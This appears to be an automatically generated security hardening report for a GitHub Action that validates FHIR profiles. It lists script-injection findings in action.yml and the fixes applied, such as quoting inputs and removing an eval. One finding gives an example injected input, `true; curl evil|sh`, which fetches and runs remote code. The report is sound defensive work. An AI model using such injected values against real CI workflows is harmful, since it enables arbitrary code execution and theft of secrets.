<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.20

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.20** was hardened automatically. 10 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b). Many steps run a workflow-controlled input env var unquoted as the condition of an if statement, e.g. `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`. Here the input value is not just expanded: the shell runs it as a command. A caller-supplied value like `true; curl evil|sh` would run any code it contains. The same pattern appears in these steps: 'Check if .NET is installed' (L90), 'Check .NET SDK Version' (L105), 'Check Firely Terminal Version' (L131), 'Detect FHIR version...' (L168, L183 `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES`, L202 `elif $INPUT_SUSHI_ENABLED`), 'Validate FHIR version support' (L285), 'Set FHIR specification...' (L363), 'Check if npm is installed' (L496), 'Check npm Version' (L509), 'Check SUSHI version' (L530), 'Pre-processing FHIR profiles' (L553 `if $CLOSE_SLICING_FOR_VALIDATION`), 'Configure Firely Terminal validator engine' (L608), 'Report Success - .NET Validator' (L648), 'Remove package cache...' (L665 `if $INPUT_JAVA_SNAPSHOT_ENABLED`, L667 `rm -rf $fhirCacheLocation`), 'Check if Java is installed' (L675). Fix: compare the quoted value to a string instead, e.g. `if [[ "$INPUT_X" == "true" ]]`.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:131`
- `action.yml:168`
- `action.yml:285`
- `action.yml:363`
- `action.yml:496`
- `action.yml:509`
- `action.yml:530`
- `action.yml:553`
- `action.yml:608`
- `action.yml:648`
- `action.yml:665`
- `action.yml:675`

### script-injection (severity: high)

Rule (b), step 'Install Firely.Terminal'. The boolean input is run as a command (`if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`). The input version is also expanded unquoted: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION > /dev/null`.

Locations:

- `action.yml:116`
- `action.yml:119`

### script-injection (severity: high)

Rule (b), step 'Simplifier login'. The boolean input is run as a command (`if $INPUT_DOTNET_VALIDATION_ENABLED; then`). The credential inputs are also expanded unquoted: `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`.

Locations:

- `action.yml:142`
- `action.yml:143`

### script-injection (severity: high)

Rule (b), step 'Install fsh-sushi'. The boolean input is run as a command (`if $INPUT_SUSHI_ENABLED; then`). The input version is also expanded unquoted: `sudo npm install -g fsh-sushi@$SUSHI_VERSION`. `$USER` is also unquoted at L520.

Locations:

- `action.yml:519`
- `action.yml:521`

### script-injection (severity: high)

Rule (b), step 'Generate conformance resources with SUSHI'. Input values are expanded unquoted: `if $INPUT_SUSHI_ENABLED; then` and `sushi $INPUT_SUSHI_OPTIONS`.

Locations:

- `action.yml:539`
- `action.yml:540`

### script-injection (severity: high)

Rule (b), step 'Run Quality Control checks'. Input values are expanded unquoted: `if $INPUT_DOTNET_VALIDATION_ENABLED; then`, `if echo $INPUT_EXPECTED_FAILS | grep -w -q VALIDATION_CONFORMANCE_DOTNET`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`.

Locations:

- `action.yml:632`
- `action.yml:634`
- `action.yml:635`
- `action.yml:637`

### script-injection (severity: high)

Rule (b), step 'Download Java Validator'. The input JAVA_VALIDATOR_DOWNLOAD_LOCATION goes through eval: `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`. Any `$(...)`, backticks or `;` in the input will run as a command. The step also runs `if $INPUT_JAVA_VALIDATION_ENABLED; then` and expands the result unquoted in `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`.

Locations:

- `action.yml:688`
- `action.yml:692`
- `action.yml:695`

### script-injection (severity: high)

Rule (b), step 'Validate all conformance resources in scope of the repository'. Input and env values are expanded unquoted: `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;` (twice), `if echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS ...`. FHIR_VERSION comes from env.FHIR_VERSION.

Locations:

- `action.yml:713`
- `action.yml:735`
- `action.yml:740`
- `action.yml:750`
- `action.yml:751`

### script-injection (severity: high)

Rule (b), step 'Validate all example resources in scope of the repository'. Input and env values are expanded unquoted: `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `if echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS ...`.

Locations:

- `action.yml:786`
- `action.yml:802`
- `action.yml:807`
- `action.yml:817`
- `action.yml:818`

### script-injection (severity: high)

Rule (b), step 'Re-run SUSHI to restore conformance resources after slicing modification'. Input values are expanded unquoted: `if $CLOSE_SLICING_FOR_VALIDATION && $INPUT_SUSHI_ENABLED; then` and `sushi $INPUT_SUSHI_OPTIONS`.

Locations:

- `action.yml:848`
- `action.yml:850`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

All changes are in action.yml. The boolean inputs are no longer run as commands: each `if $X` / `elif $X` / `&& $X` / `|| $X` is now `[[ "$X" == "true" ]]`. Single values are now double-quoted: FIRELY_TERMINAL_VERSION, "fsh-sushi@$SUSHI_VERSION", "$USER", the fhir login email= and password= arguments, rm -rf "$fhirCacheLocation", FHIR_VERSION and the wget URL. The optional PATH_TO_QUALITY_CONTROL_RULES uses ${VAR:+"$VAR"} so it drops out when empty. EXPECTED_FAILS is checked with printf '%s\n' "$VAR" | grep -w. I took out the eval in 'Download Java Validator'. Instead the documented $JAVA_VALIDATOR_VERSION / ${JAVA_VALIDATOR_VERSION} placeholder in the download URL is swapped in with bash string replacement. List inputs (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES) and the generated IG dependency string are split with unquoted array assignment, which splits and globs exactly like upstream, then expanded as "${arr[@]}". The -ig parameter lists are now built as arrays. The validator file globs keep working as "$GITHUB_WORKSPACE/$p"*.xml. I didn't touch the yq install step or the ZTS step.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Changed all '# shellcheck disable=SC2206' annotations above unquoted array assignments (sushi_args, conformance_paths, example_paths, java_opts, ig_deps) to '# shellcheck disable=SC2086' so the hardened-list exemption applies. Expansions left unquoted to preserve upstream word splitting/globbing.

### Iteration 1

**Fixes applied:** github-env-injection

**Notes:**

In action.yml, step 'Detect FHIR version and determine dependency source': fhirVersion now has newlines and carriage returns removed with printf '%s' | tr -d '\n\r' before it is written as FHIR_VERSION to $GITHUB_ENV. The other GITHUB_ENV writes in that step only write true/false, so they were left as they were.

